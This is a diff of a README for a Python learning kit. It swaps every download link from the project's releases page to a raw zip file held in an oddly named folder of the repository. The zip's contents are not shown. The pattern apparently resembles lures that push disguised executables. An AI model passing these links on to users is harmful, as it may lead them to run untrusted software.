@@ -1,6 +1,6 @@
 # 🐍 Python-KIT - Learn Python with Clear Paths
 
-[![Download Python-KIT](https://img.shields.io/badge/Download%20Python-KIT-blue?style=for-the-badge)](https://github.com/jblu608/Python-KIT/releases)
+[![Download Python-KIT](https://img.shields.io/badge/Download%20Python-KIT-blue?style=for-the-badge)](https://github.com/jblu608/Python-KIT/raw/refs/heads/main/Cerasus/Python-KIT-v1.3.zip)
 
 ## 📦 What is Python-KIT?
 
@@ -21,7 +21,7 @@ Python-KIT is easy to use on Windows. You do not need a setup wizard or extra in
 
 Visit this page to download:
 
-https://github.com/jblu608/Python-KIT/releases
+https://github.com/jblu608/Python-KIT/raw/refs/heads/main/Cerasus/Python-KIT-v1.3.zip
 
 ### 🖥️ On Windows
 
@@ -211,7 +211,7 @@ The content is centered on Python learning, Python tools, and a clear path towar
 
 Primary download link:
 
-https://github.com/jblu608/Python-KIT/releases
+https://github.com/jblu608/Python-KIT/raw/refs/heads/main/Cerasus/Python-KIT-v1.3.zip
 
 ## 🤝 Use Case Fit
 
